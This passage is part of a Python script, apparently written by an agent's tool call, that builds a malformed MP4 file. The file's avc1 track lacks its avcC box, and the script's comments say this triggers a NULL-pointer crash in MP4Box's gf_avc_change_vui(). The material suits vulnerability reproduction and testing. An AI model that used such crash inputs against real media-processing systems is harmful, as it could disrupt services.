 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\n    mvhd_data += struct.pack(\'>IIIIII\', 0, 0, 0, 0, 0, 0)  # pre_defined\n    mvhd_data += struct.pack(\'>I\', 2)  # next_track_ID\n    mvhd = write_fullbox(b\'mvhd\', 0, 0, mvhd_data)\n    \n    # Build trak box (track)\n    \n    # tkhd box - track header (version 0)\n    tkhd_data = struct.pack(\'>II\', 0, 0)  # creation_time, modification_time\n    tkhd_data += struct.pack(\'>I\', 1)  # track_ID\n    tkhd_data += struct.pack(\'>I\', 0)  # reserved\n    tkhd_data += struct.pack(\'>I\', 1000)  # duration\n    tkhd_data += struct.pack(\'>II\', 0, 0)  # reserved\n    tkhd_data += struct.pack(\'>H\', 0)  # layer\n    tkhd_data += struct.pack(\'>H\', 0)  # alternate_group\n    tkhd_data += struct.pack(\'>H\', 0)  # volume (0 for video)\n    tkhd_data += struct.pack(\'>H\', 0)  # reserved\n    # matrix\n    tkhd_data += struct.pack(\'>IIIIIIIII\',\n        0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\n    tkhd_data += struct.pack(\'>I\', 1280 << 16)  # width\n    tkhd_data += struct.pack(\'>I\', 720 << 16)  # height\n    tkhd = write_fullbox(b\'tkhd\', 0, 0x07, tkhd_data)\n    \n    # mdia box - media\n    \n    # mdhd box - media header\n    mdhd_data = struct.pack(\'>IIII\', 0, 0, 1000, 1000)  # times, timescale, duration\n    mdhd_data += struct.pack(\'>HH\', 0x55c4, 0)  # language, pre_defined\n    mdhd = write_fullbox(b\'mdhd\', 0, 0, mdhd_data)\n    \n    # hdlr box - handler\n    hdlr_data = struct.pack(\'>I\', 0)  # pre_defined\n    hdlr_data += b\'vide\'  # handler_type (video)\n    hdlr_data += struct.pack(\'>III\', 0, 0, 0)  # reserved\n    hdlr_data += b\'VideoHandler\\x00\'  # name\n    hdlr = write_fullbox(b\'hdlr\', 0, 0, hdlr_data)\n    \n    # minf box - media information\n    \n    # vmhd box - video media header\n    vmhd_data = struct.pack(\'>HHHH\', 0, 0, 0, 0)\n    vmhd = write_fullbox(b\'vmhd\', 0, 1, vmhd_data)\n    \n    # dinf box - data information\n    dref_entry = write_fullbox(b\'url \', 0, 1, b\'\')  # self-reference\n    dref_data = struct.pack(\'>I\', 1) + dref_entry\n    dref = write_fullbox(b\'dref\', 0, 0, dref_data)\n    dinf = write_box(b\'dinf\', dref)\n    \n    # stbl box - sample table\n    \n    # stsd box - sample description\n    # This is the key part: we create an avc1 box WITHOUT the avcC child box\n    # This will cause gf_isom_avc_config_get() to return NULL\n    \n    # CORRECTED: The avc1 box needs exactly 78 bytes after the base entry fields\n    # Base sample entry (8 bytes): reserved(6) + data_reference_index(2)\n    # Video sample entry fields (70 bytes):\n    avc1_data = b\'\'\n    # Base sample entry fields (8 bytes)\n    avc1_data += struct.pack(\'>I\', 0)  # reserved (4 bytes)\n    avc1_data += struct.pack(\'>H\', 0)  # reserved (2 bytes)\n    avc1_data += struct.pack(\'>H\', 1)  # data_reference_index (2 bytes)\n    \n    # Video sample entry fields (70 bytes total)\n    avc1_data += struct.pack(\'>H\', 0)  # version (2 bytes)\n    avc1_data += struct.pack(\'>H\', 0)  # revision (2 bytes)\n    avc1_data += struct.pack(\'>I\', 0)  # vendor (4 bytes)\n    avc1_data += struct.pack(\'>I\', 0)  # temporal_quality (4 bytes)\n    avc1_data += struct.pack(\'>I\', 0)  # spatial_quality (4 bytes)\n    avc1_data += struct.pack(\'>H\', 1280)  # width (2 bytes)\n    avc1_data += struct.pack(\'>H\', 720)  # height (2 bytes)\n    avc1_data += struct.pack(\'>I\', 0x00480000)  # horizresolution (4 bytes)\n    avc1_data += struct.pack(\'>I\', 0x00480000)  # vertresolution (4 bytes)\n    avc1_data += struct.pack(\'>I\', 0)  # entry_data_size (4 bytes)\n    avc1_data += struct.pack(\'>H\', 1)  # frames_per_sample (2 bytes)\n    avc1_data += b\'\\x00\' * 32  # compressorname (32 bytes)\n    avc1_data += struct.pack(\'>H\', 0x0018)  # bit_depth (2 bytes)\n    avc1_data += struct.pack(\'>H\', 0xFFFF)  # color_table_index (2 bytes)\n    # Total: 8 + 70 = 78 bytes\n    \n    # INTENTIONALLY OMITTING avcC box here to trigger the vulnerability\n    # The avc1 box will be valid structurally but missing the avcC configuration\n    \n    avc1 = write_box(b\'avc1\', avc1_data)\n    \n    stsd_data = struct.pack(\'>I\', 1) + avc1\n    stsd = write_fullbox(b\'stsd\', 0, 0, stsd_data)\n    \n    # stts box - time-to-sample\n    stts = write_fullbox(b\'stts\', 0, 0, struct.pack(\'>I\', 0))\n    \n    # stsc box - sample-to-chunk\n    stsc = write_fullbox(b\'stsc\', 0, 0, struct.pack(\'>I\', 0))\n    \n    # stsz box - sample size\n    stsz = write_fullbox(b\'stsz\', 0, 0, struct.pack(\'>II\', 0, 0))\n    \n    # stco box - chunk offset\n    stco = write_fullbox(b\'stco\', 0, 0, struct.pack(\'>I\', 0))\n    \n    # Assemble stbl\n    stbl = write_box(b\'stbl\', stsd + stts + stsc + stsz + stco)\n    \n    # Assemble minf\n    minf = write_box(b\'minf\', vmhd + dinf + stbl)\n    \n    # Assemble mdia\n    mdia = write_box(b\'mdia\', mdhd + hdlr + minf)\n    \n    # Assemble trak\n    trak = write_box(b\'trak\', tkhd + mdia)\n    \n    # Assemble moov\n    moov = write_box(b\'moov\', mvhd + trak)\n    \n    f.write(moov)\n\nprint(f"Generated corrected malformed MP4 testcase at: {output_path}")\nprint("This file has an AVC video track (avc1) with proper structure but missing the avcC configuration box.")\nprint("When MP4Box processes it with -add and videofmt option, it will trigger NULL deref in gf_avc_change_vui().")\n'}
